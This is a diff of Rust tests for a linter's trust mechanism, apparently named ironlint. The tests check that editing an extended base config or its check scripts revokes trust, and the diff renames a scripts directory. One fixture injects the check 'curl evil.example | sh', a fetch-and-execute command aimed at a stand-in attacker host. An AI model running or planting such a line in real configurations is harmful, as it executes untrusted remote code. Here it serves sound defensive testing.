@@ -3,7 +3,7 @@
 //! A blessed child that `extends:` a base in another directory pulls checks from
 //! that base (local wins on collision, but base checks still run). If the trust
 //! hash folds only the child's own bytes, an attacker can edit the base — or a
-//! check script under the base's `.ironlint/gates/` — to inject a check that runs
+//! check script under the base's `.ironlint/scripts/` — to inject a check that runs
 //! with no review. These tests lock the hash to the full closure and lock
 //! `bless` to validating the closure (not just the local file).
 
@@ -20,14 +20,14 @@ fn write(p: &Path, body: &str) {
 
 /// Lay out a child config that `extends:` a base in a sibling directory. The
 /// base carries its own check plus a script under the base dir's
-/// `.ironlint/gates/`. Returns `(child, base, base_script)`.
+/// `.ironlint/scripts/`. Returns `(child, base, base_script)`.
 fn setup(root: &Path) -> (PathBuf, PathBuf, PathBuf) {
     let base = root.join("base/base.ironlint.yml");
     write(
         &base,
-        "checks:\n  base-gate:\n    files: \"*\"\n    run: \".ironlint/gates/base.sh\"\n",
+        "checks:\n  base-gate:\n    files: \"*\"\n    run: \".ironlint/scripts/base.sh\"\n",
     );
-    let base_script = root.join("base/.ironlint/gates/base.sh");
+    let base_script = root.join("base/.ironlint/scripts/base.sh");
     write(&base_script, "#!/bin/sh\nexit 0\n");
 
     let child = root.join("child/.ironlint.yml");
@@ -66,7 +66,7 @@ fn mutating_the_extended_base_revokes_trust() {
     bless_in(&child, &store_path, "t").unwrap();
     write(
         &base,
-        "checks:\n  base-gate:\n    files: \"*\"\n    run: \".ironlint/gates/base.sh\"\n\
+        "checks:\n  base-gate:\n    files: \"*\"\n    run: \".ironlint/scripts/base.sh\"\n\
          \x20\x20evil:\n    files: \"*\"\n    run: \"curl evil.example | sh\"\n",
     );
 
@@ -78,7 +78,7 @@ fn mutating_the_extended_base_revokes_trust() {
 
 #[test]
 fn mutating_a_base_gate_script_revokes_trust() {
-    // The base's check scripts live under the base dir's .ironlint/gates/, outside
+    // The base's check scripts live under the base dir's .ironlint/scripts/, outside
     // the child dir. Swapping one must revoke trust just like editing the base
     // config itself.
     let root = tempdir().unwrap();
@@ -91,7 +91,7 @@ fn mutating_a_base_gate_script_revokes_trust() {
 
     assert!(
         ensure_trusted_in(&child, &store_path).is_err(),
-        "editing a check script under the base's .ironlint/gates must revoke trust"
+        "editing a check script under the base's .ironlint/scripts must revoke trust"
     );
 }
 
